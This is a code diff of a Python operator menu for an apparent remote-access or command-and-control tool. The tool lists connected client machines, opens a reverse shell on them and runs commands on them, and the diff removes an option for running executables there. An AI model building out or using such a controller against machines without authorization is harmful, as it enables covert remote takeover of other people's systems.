@@ -4,7 +4,7 @@ from front import admin
 
 stayInProgram=True
 res=False
-commands = ['help','listClients','popShell', 'execProgram','runComand', 'testServer', 'testClient','exit']
+commands = ['help','listClients','popShell','runComand', 'testServer', 'testClient','exit']
 
 exit = len(commands) - 1
 
@@ -17,11 +17,10 @@ while stayInProgram :
         "0 - help" + "\n" +
         "1 - listClients" +  "\n" +
         "2 - popShell"  + "\n" +
-        "3 - execProgram" +  "\n" +
-        "4 - runComand"  + "\n" +
-        "5 - testServer"  + "\n" +
-        "6 - testClient"  + "\n" +
-        "7 - exit"  + "\n"
+        "3 - runComand"  + "\n" +
+        "4 - testServer"  + "\n" +
+        "5 - testClient"  + "\n" +
+        "6 - exit"  + "\n"
     )
     command = exit;
 
@@ -42,11 +41,10 @@ while stayInProgram :
         "0 - help: describe the program and the commands of program " "\n\n" +
         "1 - listClients: list full clients." + "\n\n" + 
         "2 - popShell: runs a reverse shell." + "\n\n" + 
-        "3 - execProgram: executable runs on the client machine." + "\n\n" + 
-        "4 - runComand: run a command on the client machine."  + "\n\n" +
-        "5 - testServer: tests the connection to the server."  + "\n\n" +
-        "6 - testClient: tests the connection on the client machine."  + "\n\n" +
-        "7 - exit: disconnects of the server."  + "\n"
+        "3 - runComand: run a command on the client machine."  + "\n\n" +
+        "4 - testServer: tests the connection to the server."  + "\n\n" +
+        "5 - testClient: tests the connection on the client machine."  + "\n\n" +
+        "6 - exit: disconnects of the server."  + "\n"
     )
 
     elif (command == 1): #listClients
@@ -75,23 +73,7 @@ while stayInProgram :
             print("Returned Error!!")
 
 
-    elif (command == 3): #execProgram
-        try:
-            if not (master.displayClients()):
-                raise Exception("Não achado\n")
-            
-            client = int(input("What client?"))
-            print("\n")
-            program = input("what file?")
-            print("\n")
-
-            if not (master.executeProgram(program,client)):
-                raise Exception("Não achado\n")
-        except:
-            print("Returned Error!!")
-
-
-    elif (command == 4): #runComand
+    elif (command == 3): #runComand
         try:
             if not (master.displayClients()):
                 raise Exception("Não achado\n")
@@ -106,14 +88,14 @@ while stayInProgram :
         except:
             print("Returned Error!!")
     
-    elif (command == 5): #testServer
+    elif (command == 4): #testServer
         try:
             if not(master.testServer()):
                 raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
     
-    elif (command == 6): #testClient
+    elif (command == 5): #testClient
         try:
             if not (master.displayClients()):
                 raise Exception("Não achado\n")
@@ -140,6 +122,7 @@ while stayInProgram :
     else:
         print("Finish the program")
 
-
 #{listClients:ok,popShell:ok,execProgram:no,runComand:ok,testServer:ok,testeClient:ok}
-#lC:ok,pS:ok,eP:n,rC:ok,tS:ok,tC:ok ouvir:no
+#lC:ok,pS:ok,eP:n,rC:ok,tS:ok,tC:ok
+
+#falta apenas senha para o adm e enviar e receber arquivos
